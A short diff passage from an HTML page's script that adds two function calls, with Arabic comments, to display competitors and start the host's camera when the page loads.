+            // عرض المنافسين
+            displayCompetitors();
+            
+            // تشغيل الكاميرا
+            startHostCamera();
         };
     </script>
 </body>
